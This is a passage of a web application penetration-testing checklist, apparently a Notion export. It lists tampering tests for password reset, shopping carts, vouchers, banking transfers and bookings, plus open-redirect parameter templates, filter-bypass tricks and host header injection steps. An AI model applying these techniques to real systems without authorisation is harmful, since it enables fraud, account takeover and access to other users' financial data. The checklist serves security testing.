checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check account deletion option if application provides it and confirm that via forgot password feature</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8181-8647-f9ddb34e5f08" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Change email id, account id, user id parameter and try to brute force other user&#x27;s password</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8179-a2d5-d4279f9374ea" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check whether application re authenticates for performing sensitive operation for post authentication features</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-80d3-b08f-fafeec447ab8" open="" class="toggle" dir="auto"><summary><strong>Forgot Password Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-81c3-812a-de6b292bcafb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Failure to invalidate session on Logout and Password reset</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81cf-a112-cc8fdea089e3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if forget password reset link/code uniqueness</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8147-b555-d15762d774d7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if reset link does get expire or not if its not used by the user for certain amount of time</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-815a-a1f6-c99a0229aff2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Find user account identification parameter and tamper Id or parameter value to change other user&#x27;s password</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8106-bdee-fc9d7cf1c091" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for weak password policy</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810f-81fa-db526e017a9e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Weak password reset implementation Token is not invalidated after use</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81d8-9c9a-df9be3787578" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If reset link has another param such as date and time, then. Change date and time value in order to make active &amp; valid reset link</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f3-a91c-eea1c3cedc18" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if security questions are asked? How many guesses allowed? --&gt; Lockout policy maintained or not?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c1-959b-c18963e81ce9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Add only spaces in new password and confirmed password. Then Hit enter and see the result</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8135-a66d-e828f225a4e3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Does it display old password on the same page after completion of forget password formality?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f8-8e32-e3d6055afe80" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Ask for two password reset link and use the older one from user&#x27;s email</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-812c-8f9c-f45158bdce32" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if active session gets destroyed upon changing the password or not?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817d-b820-f872b0281c5d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Weak password reset implementation Password reset token sent over HTTP</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817c-a6e2-ed05733c84a4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Send continuous forget password requests so that it may send sequential tokens</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-80d4-8575-ddf41531fed5" open="" class="toggle" dir="auto"><summary><strong>Contact Us Form Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-81b7-916a-e75534891ea0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks? Try Captcha Testing &amp; Bypasss</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b3-bfec-d8dd52062dc6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Does it allow to upload file on the server?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810b-a22a-f4dc9ff2da44" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Blind XSS</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8000-b5c3-e133789c995d" open="" class="toggle" dir="auto"><summary><strong>Product Purchase Testing</strong></summary><div class="indented"><details id="134b0a6a-b787-81aa-9baf-dcb9c1135ebc" open="" class="toggle" dir="auto"><summary>Buy Now</summary><div class="indented"><ul id="134b0a6a-b787-8199-baa2-dcbb7a4d7ed6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper product ID to purchase other high valued product with low prize</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8157-aa04-fe57b98b3a12" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper product data in order to increase the number of product with the same prize</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81f2-8299-ceaf211a78d4" open="" class="toggle" dir="auto"><summary>Gift/Voucher</summary><div class="indented"><ul id="134b0a6a-b787-811b-9676-eb611b4a868d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper gift/voucher count in the request (if any) to increase/decrease the number of vouchers/gifts to be used</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81fe-94ca-f78e74b2ffcf" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper gift/voucher value to increase/decrease the value of the voucher in terms of money. (e.g. $100 is given as a voucher, tamper value to increase, decrease money)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-819f-93ea-d2048c8ddc67" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Reuse gift/voucher by using old gift values in parameter tampering</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8194-802f-cc11823dc9bb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check the uniqueness of gift/voucher parameter and try guessing other gift/voucher code</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8178-9e10-e2ef01425178" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Use parameter pollution technique to add the same voucher twice by adding same parameter name and value again with &amp; in the BurpSuite request</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-817d-a1b1-fb76b9097283" open="" class="toggle" dir="auto"><summary>Add/Delete Product from Cart</summary><div class="indented"><ul id="134b0a6a-b787-81d3-a97e-dfca779f2582" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper user id to delete products from other user&#x27;s cart</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8112-99ea-d22cfb472864" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper cart id to add/delete products from other user&#x27;s cart</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8129-93a2-ec2d2593cf26" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Identify cart id/user id for cart feature to view the added items from other user&#x27;s account</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-814a-9e08-fae077ba277c" open="" class="toggle" dir="auto"><summary>Address</summary><div class="indented"><ul id="134b0a6a-b787-81b1-ae3d-d7fb1b1970e1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper BurpSuite request to change other user&#x27;s shipping address to yours</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810e-b292-c8af507bf4f8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try stored XSS by adding XSS vector on shipping address</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c9-ae73-e62c43c2b84d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Use parameter pollution technique to add two shipping address instead of one trying to manipulate application to send same item on two shipping address</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8164-a720-d764f605840d" open="" class="toggle" dir="auto"><summary>Place Order</summary><div class="indented"><ul id="134b0a6a-b787-817a-8aa5-d8d4ea7f7c86" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper payment options parameter to change the payment method. E.g. Consider some items cannot be ordered for cash on delivery but tampering request parameters from debit/credit/PayPal/net banking option to cash on delivery may allow you to<br/>place order for that particular item</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e3-a44e-f4940ff14f8a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tamper the amount value for payment manipulation in each main and sub requests and responses</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8151-a011-fce89c091886" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if CVV is going in cleartext or not</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e9-8c43-e43e08f29883" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if the application itself processes your card details and then performs a transaction or it calls any third-party payment processing company to perform a transaction</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-811e-aa14-df3e19d66aef" open="" class="toggle" dir="auto"><summary>Track Order</summary><div class="indented"><ul id="134b0a6a-b787-818a-9239-c34a54662c36" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Track other user&#x27;s order by guessing order tracking number</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8159-ad4c-e12785e477a6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Brute force tracking number prefix or suffix to track mass orders for other users</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81b3-9e30-f281a38a1e5c" open="" class="toggle" dir="auto"><summary>Wish list page testing</summary><div class="indented"><ul id="134b0a6a-b787-8197-801d-dec82471cc1c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if a user A can add/remote products in Wishlist of other user B’s account</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8104-99c4-cece20f54659" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if a user A can add products into user B’s cart from his/her (user A’s) Wishlist section.</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81ff-a5c8-d00579db9f9b" open="" class="toggle" dir="auto"><summary>Post product purchase testing</summary><div class="indented"><ul id="134b0a6a-b787-81a6-8e56-f3e254776066" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user A can cancel orders for user B’s purchase</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8181-aea2-f532e7b07af5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user A can view/check orders already placed by user B</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-815d-8963-d340820b8fce" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user A can modify the shipping address of placed order by user B</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8199-89c9-f6831d0fbe55" open="" class="toggle" dir="auto"><summary>Out of band testing</summary><div class="indented"></div></details></div></details><details id="134b0a6a-b787-8023-be9d-fb122f95a981" open="" class="toggle" dir="auto"><summary><strong>Banking Application Testing</strong></summary><div class="indented"><details id="134b0a6a-b787-8149-8eb1-e60cca14923d" open="" class="toggle" dir="auto"><summary>Billing Activity</summary><div class="indented"><ul id="134b0a6a-b787-81be-a7eb-d7261f7b9cd2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can view the account statement for user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8185-b498-f6f047804c5c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can view the transaction report for user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a1-80f0-c57bd57eeaa3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can view the summary report for user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8142-8198-fc5f3523ba29" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can register for monthly/weekly account statement via email behalf of user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81d1-9b63-c9752425ff9c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can update the existing email id of user &#x27;B&#x27; in order to retrieve monthly/weekly account summary</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8137-a130-e31c942f4876" open="" class="toggle" dir="auto"><summary>Deposit/Loan/Linked/External Account Checking</summary><div class="indented"><ul id="134b0a6a-b787-8172-83b5-dbf8d756db1f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can view the deposit account summary of user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8116-a160-e1e0ffe97de3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for account balance tampering for Deposit accounts</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-810c-8783-ddaabd355b8a" open="" class="toggle" dir="auto"><summary>Tax Deduction Inquiry Testing</summary><div class="indented"><ul id="134b0a6a-b787-8103-a7bf-ee30baa3c120" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; with it&#x27;s customer id &#x27;a&#x27; can see the tax deduction details of user &#x27;B&#x27; by tampering his/her customer id &#x27;b&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8158-8f9f-c7141be4bb82" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check parameter tampering for increasing and decreasing interest rate, interest amount, and tax refund</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b6-8b58-f3772b4e0d24" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can download the TDS details of user &#x27;B’</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-81d5-bc5f-fb12d59fd73f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can request for the cheque book behalf of user ‘B’.</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-8168-9d49-ff6446d18b45" open="" class="toggle" dir="auto"><summary>Fixed Deposit Account Testing</summary><div class="indented"><ul id="134b0a6a-b787-81cd-868e-d3a5800c911b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if is it possible for user &#x27;A&#x27; to open FD account behalf of user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8149-962a-fa894374c46a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if Can user open FD account with the more amount than the current account balance</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81a6-917e-c049e36f2fed" open="" class="toggle" dir="auto"><summary>Stopping Payment on basis of cheque/date range</summary><div class="indented"><ul id="134b0a6a-b787-8122-9b8a-ed4adf112246" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; stop the payment of user &#x27;B&#x27; via cheque number</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-818b-a310-ee9e380c7048" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; stop the payment on basis of date range for user &#x27;B’</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-814e-bd7a-ffc9cc45a93b" open="" class="toggle" dir="auto"><summary>Status Enquiry Testing</summary><div class="indented"><ul id="134b0a6a-b787-81a9-805c-c70c4279ccd3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; view the status enquiry of user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8144-9d60-d0af6522d24f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; modify the status enquiry of user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8194-8457-e94c68cdafb7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; post and enquiry behalf of user &#x27;B&#x27; from his own account</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8173-bb31-d72aea8a5195" open="" class="toggle" dir="auto"><summary>Fund transfer testing</summary><div class="indented"><ul id="134b0a6a-b787-8122-b06e-c87bfac0134f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Is it possible to transfer funds to user &#x27;C&#x27; instead of user &#x27;B&#x27; from the user &#x27;A&#x27; which was intended to transfer from user &#x27;A&#x27; to user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c0-b8b8-d7ff3eea3ecc" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can fund transfer amount be manipulated?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816a-b267-c65e66c83028" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; modify the payee list of user &#x27;B&#x27; by parameter manipulation using his/her own account</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8150-88b9-ef169ec89840" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Is it possible to add payee without any proper validation in user &#x27;A&#x27; &#x27;s own account or to user &#x27;B&#x27; &#x27;s account</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-812b-bbdf-f675bda2b195" open="" class="toggle" dir="auto"><summary>Schedule transfer testing</summary><div class="indented"><ul id="134b0a6a-b787-8120-a239-edfb8dc81511" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; view the schedule transfer of user &#x27;B&#x27;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-814e-8dd8-fa371a90053f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Can user &#x27;A&#x27; change the details of schedule transfer for user &#x27;B’</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8192-bfa3-fb9da6451415" open="" class="toggle" dir="auto"><summary>Testing of fund transfer via NEFT</summary><div class="indented"><ul id="134b0a6a-b787-8151-b5b9-eab46f8d224d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Amount manipulation via NEFT transfer</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ff-825c-d3499a7e0a36" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user &#x27;A&#x27; can view the NEFT transfer details of user &#x27;B’</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-812c-981d-f2f52a6b7d41" open="" class="toggle" dir="auto"><summary>Testing for Bill Payment</summary><div class="indented"></div></details></div></details><details id="134b0a6a-b787-806f-86b3-d241477e409a" open="" class="toggle" dir="auto"><summary><strong>Flight/Railway/Hotel Booking Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-8110-8d94-f80729c6b412" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check other user’s e-ticket</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8148-a65e-cf77dbf2c090" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Get refund behalf of other user</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8122-9733-d139f9af8d4a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Get more refund by changing refund amount</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8160-8968-d506ce2e1ba1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Book business/high class ticket by changing parameter value of economy class variable</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f4-a5e8-c9bbe705c1de" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Book deluxe room by changing parameter value of normal fare</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b3-86fb-c87289594039" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Book multiple/seats by changing quantity parameter value for 1 seat/room book</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8002-b999-c06223b486cc" open="" class="toggle" dir="auto"><summary><strong>Open Redirection Testing</strong></summary><div class="indented"><details id="134b0a6a-b787-8188-a784-eeaa166f40dd" open="" class="toggle" dir="auto"><summary>Common injection parameters</summary><div class="indented"><pre id="134b0a6a-b787-816b-9a10-d2f2409ea872" class="code code-wrap" data-notion-code-syntax="markup"><code class="language-markup" style="white-space:pre-wrap;word-break:break-all">/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}</code></pre></div></details><ul id="134b0a6a-b787-810f-9e7a-dd8015c4ddb0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Use burp &#x27;find&#x27; option in order to find parameters such as URL, red, redirect, redir, origin, redirect_uri, target etc</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8137-a8e3-ff55e66dd30f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check the value of these parameter which may contain a URL</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817c-83c1-c03676474196" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Change the URL value to <a href="http://www.chintan.com/">www.tushar.com</a> and check if gets redirected or not</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f3-b9a6-d74e18750bd9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try Single Slash and url encoding </span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b4-91ec-ef0939da9de8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using a whitelisted domain or keyword</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8119-9f2f-f3c8715d1b52" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using // to bypass http blacklisted keyword</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-814d-823f-d6b16f430f97" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using https: to bypass // blacklisted keyword</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e1-8ca5-d8ba41a857a1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using \\ to bypass // blacklisted keyword</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8144-b7d0-ed1a41e52ee1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using \/\/ to bypass // blacklisted keyword</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8143-9f1c-f6fdc81c376a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using null byte %00 to bypass blacklist filter</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8183-902d-d5bde2a3a7da" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using ° symbol to bypass</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-808b-8801-e85f5f7eef3e" open="" class="toggle" dir="auto"><summary><strong>Host Header Injection</strong></summary><div class="indented"><ul id="134b0a6a-b787-8198-a867-de27f81728d7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Supply an arbitrary Host header</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8193-90b7-d50121200966" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for flawed validation</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-8116-a745-f5ff656b1034" open="" class="toggle" dir="auto"><summary>Send ambiguous requests</summary><div class="indented"><ul id="134b0a6a-b787-811e-81ee-fa4cb8d461ce" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Inject duplicate Host headers</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8126-994c-fd616be8cd45" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Supply an absolute URL</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8175-9ff2-f214eaa6de5d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Add line wrapping</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-8111-8391-da98fa4c7215" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Inject host override headers</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-807f-b5b5-e0ce46f0d1a6" open="" class="toggle" dir="auto"><summary><strong>Cross-Site Scripting 